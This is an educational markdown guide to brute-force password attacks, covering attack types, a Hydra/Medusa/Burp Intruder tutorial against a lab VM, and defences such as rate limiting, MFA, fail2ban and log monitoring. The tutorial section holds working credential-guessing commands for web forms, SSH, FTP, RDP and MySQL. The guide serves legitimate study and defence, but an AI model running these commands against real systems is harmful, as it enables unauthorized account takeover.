# Brute Force Attack Guide & Prevention

## Table of Contents
- [What is a Brute Force Attack?](#what-is-a-brute-force-attack)
- [Types of Brute Force Attacks](#types-of-brute-force-attacks)
- [Practical Attack Tutorial](#practical-attack-tutorial)
- [Protection Methods](#protection-methods)
- [Detection & Monitoring](#detection--monitoring)

---

## What is a Brute Force Attack?

A brute force attack is a trial-and-error method used to obtain information such as passwords or login credentials. The attacker systematically tries different combinations until finding the correct one.

### Key Characteristics:
- **Time-consuming**: Can take seconds to years depending on password complexity
- **Resource-intensive**: Requires computational power and bandwidth
- **Simple concept**: No sophisticated techniques required
- **Highly effective**: Against weak passwords and unprotected systems

---

## Types of Brute Force Attacks

### 1. Simple Brute Force
Attempts all possible combinations of characters systematically.

**Example**: `a`, `b`, `c`... then `aa`, `ab`, `ac`...

### 2. Dictionary Attack
Uses pre-compiled lists of common passwords and words.

**Popular wordlists**:
- `rockyou.txt` (14+ million passwords from real breach)
- `SecLists/Passwords/Common-Credentials/`
- `10-million-password-list-top-1000000.txt`

### 3. Hybrid Attack
Combines dictionary words with numbers and symbols.

**Example**: `password` → `password123`, `p@ssword`, `Password!`

### 4. Credential Stuffing
Uses username/password pairs leaked from other breaches.

---

## Practical Attack Tutorial

### Tools Used

**Hydra**: Fast network login cracker
```bash
# Install on Kali Linux
apt-get install hydra

# Or on macOS
brew install hydra
```

### Attack Scenario: Web Login Form

#### Step 1: Identify the Target

**POST Request Example**:
```
URL: http://VM-IP/admin/
Method: POST
Parameters:
  - username: admin
  - password: [testing]
  - Login: Login
```

**GET Request Example**:
```
URL: http://VM-IP/index.php?page=signin&username=admin&password=wd&Login=Login
Method: GET
```

#### Step 2: Identify Failure Response

Test a wrong password and look for failure indicators:
```html
<!-- Failure response -->
<center>
    <h2 style="margin-top:50px;"></h2>
    <br/>
    <img src="../images/WrongAnswer.gif" alt="">
</center>
```

**Key indicator**: `WrongAnswer.gif` or `WrongAnswer` string

#### Step 3: Prepare Wordlist

```bash
# Use existing wordlist
ls ~/wordlists/SecLists/Passwords/Common-Credentials/

# Or create custom wordlist
cat > custom_wordlist.txt << EOF
admin
password
123456
letmein
welcome
EOF
```

#### Step 4: Launch Hydra Attack

**For POST Request**:
```bash
hydra -l admin \
  -P ~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
  -t 4 -V -f \
  VM-IP \
  http-post-form "/admin/:username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer"
```

**For GET Request**:
```bash
hydra -l admin \
  -P ~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt \
  -t 4 -V -f \
  VM-IP \
  http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=WrongAnswer"
```

### Hydra Parameters Explained

| Parameter | Description | Example |
|-----------|-------------|---------|
| `-l` | Single username | `-l admin` |
| `-L` | Username list file | `-L users.txt` |
| `-p` | Single password | `-p password123` |
| `-P` | Password list file | `-P wordlist.txt` |
| `-t` | Number of parallel threads | `-t 4` |
| `-V` | Verbose (show each attempt) | `-V` |
| `-v` | Verbose (show valid login only) | `-v` |
| `-f` | Stop after first valid password | `-f` |
| `-s` | Custom port | `-s 8080` |
| `F=` | Failure string to detect | `F=WrongAnswer` |
| `S=` | Success string to detect | `S=Welcome` |

### Advanced Hydra Examples

**Multiple usernames**:
```bash
hydra -L users.txt -P passwords.txt \
  VM-IP \
  http-post-form "/admin/:username=^USER^&password=^PASS^:F=incorrect"
```

**Single password against multiple users** (Reverse brute force):
```bash
hydra -L users.txt -p password123 \
  VM-IP \
  http-post-form "/admin/:username=^USER^&password=^PASS^:F=incorrect"
```

**With custom port**:
```bash
hydra -l admin -P wordlist.txt -s 8080 \
  VM-IP \
  http-post-form "/admin/:username=^USER^&password=^PASS^:F=incorrect"
```

**SSH Brute Force**:
```bash
hydra -l root -P wordlist.txt \
  VM-IP \
  ssh
```

**FTP Brute Force**:
```bash
hydra -l admin -P wordlist.txt \
  VM-IP \
  ftp
```

### Other Tools

**Medusa** (alternative to Hydra):
```bash
medusa -h VM-IP \
  -u admin \
  -P wordlist.txt \
  -M http \
  -m DIR:/admin
```

**Burp Suite Intruder**:
1. Intercept login request
2. Send to Intruder
3. Set password field as payload position
4. Load wordlist
5. Start attack
6. Look for different response lengths/status codes

---

## Protection Methods

### 1. Account Lockout Policy

Lock accounts after failed attempts.

**Implementation**:
```python
# Pseudocode
if failed_attempts >= 5:
    lock_account_for(minutes=15)
    send_alert_to_admin()
```

### 2. Rate Limiting

Limit authentication requests per IP.

**Nginx Configuration**:
```nginx
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

location /login {
    limit_req zone=login burst=10 nodelay;
}
```

**Apache with mod_evasive**:
```apache
<IfModule mod_evasive20.c>
    DOSHashTableSize 3097
    DOSPageCount 5
    DOSSiteCount 100
    DOSPageInterval 1
    DOSBlockingPeriod 600
</IfModule>
```

### 3. Multi-Factor Authentication (MFA)

Require additional verification beyond password.

**Types**:
- SMS/Email codes (OTP)
- Authenticator apps (Google Authenticator, Authy)
- Hardware tokens (YubiKey)
- Biometrics

### 4. Strong Password Policy

**Requirements**:
- Minimum 12-16 characters
- Mix of uppercase, lowercase, numbers, symbols
- No dictionary words
- Check against leaked password databases

### 5. CAPTCHA

Implement after suspicious activity.

**When to trigger**:
- After 3 failed attempts
- Rapid-fire requests
- Known bot behavior

### 6. Web Application Firewall (WAF)

Use services like:
- Cloudflare
- AWS WAF
- ModSecurity

---

## Detection & Monitoring

### Signs of Brute Force Attack

1. **High volume of failed logins** from single IP
2. **Sequential password attempts** (dictionary order)
3. **Multiple IPs targeting same account** (distributed attack)
4. **Consistent timing between requests** (automated)

### Monitoring Commands

**Check failed SSH attempts**:
```bash
grep "Failed password" /var/log/auth.log | tail -50
```

**Count failures by IP**:
```bash
grep "Failed password" /var/log/auth.log | \
  awk '{print $(NF-3)}' | \
  sort | uniq -c | sort -nr
```

**Check web server logs**:
```bash
grep "POST /login" /var/log/apache2/access.log | \
  awk '{print $1}' | \
  sort | uniq -c | sort -nr | head -20
```

### Fail2ban Configuration

**Install**:
```bash
apt-get install fail2ban
```

**Configuration** (`/etc/fail2ban/jail.local`):
```ini
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 5
bantime = 3600

[apache-auth]
enabled = true
port = http,https
filter = apache-auth
logpath = /var/log/apache2/error.log
maxretry = 5
bantime = 3600
```

### Real-Time Monitoring

**Watch login attempts**:
```bash
tail -f /var/log/auth.log | grep "Failed password"
```

**Monitor with ELK Stack**:
```yaml
# Logstash filter for brute force detection
filter {
  if [message] =~ "Failed password" {
    mutate {
      add_tag => ["failed_login"]
    }
  }
}
```

---

## Best Practices Summary

### For Penetration Testers (CTF/Legal Testing):

✅ **Always get written permission** before testing
✅ **Use controlled environments** (personal labs, CTF platforms)
✅ **Document your findings** thoroughly
✅ **Start with small wordlists** to avoid overwhelming targets
✅ **Use appropriate thread count** (-t flag) to avoid DoS

### For Defenders:

✅ **Implement multiple layers** (MFA + rate limiting + monitoring)
✅ **Monitor logs regularly** for suspicious patterns
✅ **Update systems** and patch vulnerabilities
✅ **Educate users** about password security
✅ **Test your defenses** with authorized penetration testing

---

## Quick Reference

### Common Hydra Commands

```bash
# Web form POST
hydra -l USER -P wordlist.txt IP http-post-form "PATH:PARAMS:FAIL_STRING"

# Web form GET
hydra -l USER -P wordlist.txt IP http-get-form "PATH:PARAMS:FAIL_STRING"

# SSH
hydra -l USER -P wordlist.txt IP ssh

# FTP
hydra -l USER -P wordlist.txt IP ftp

# RDP
hydra -l USER -P wordlist.txt IP rdp

# MySQL
hydra -l USER -P wordlist.txt IP mysql
```

### Common Wordlists Locations

```bash
# Kali Linux
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/

# Custom location
~/wordlists/SecLists/Passwords/Common-Credentials/
```

---

## Additional Resources

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
- [SecLists Repository](https://github.com/danielmiessler/SecLists)
- [Fail2ban Documentation](https://www.fail2ban.org/)

---

**⚠️ Legal Disclaimer**: This guide is for educational purposes only (CTF, authorized penetration testing). Always obtain proper authorization before testing security on any system you don't own. Unauthorized access is illegal.